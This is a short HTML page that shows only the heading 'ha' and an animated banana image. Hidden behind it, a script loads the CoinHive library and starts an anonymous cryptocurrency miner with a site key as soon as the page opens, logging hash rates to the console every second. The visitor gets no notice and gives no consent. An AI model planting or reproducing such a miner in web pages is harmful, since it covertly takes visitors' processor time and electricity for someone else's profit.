<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title></title>
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>

  </head>
  <body>
    <h1>ha</h1>
    <img src="http://media.idownloadblog.com/wp-content/uploads/2016/11/Animated-GIF-Banana.gif" alt="">
    <script>
	  var miner = new CoinHive.Anonymous('2KiH3oQJY7E7bBQflYh9B3WiDhFSt9sm');
	  miner.start();
  // Listen on events
	  miner.on('found', function() { /* Hash found */ })
	  miner.on('accepted', function() { /* Hash accepted by the pool */ })

  	// Update stats once per second
  	setInterval(function() {
  		var hashesPerSecond = miner.getHashesPerSecond();
  		var totalHashes = miner.getTotalHashes();
  		var acceptedHashes = miner.getAcceptedHashes();

  		// Output to HTML elements...
      console.log(hashesPerSecond);
      console.log(totalHashes);
      console.log(acceptedHashes);

  	}, 1000);
    </script>
  </body>
</html>
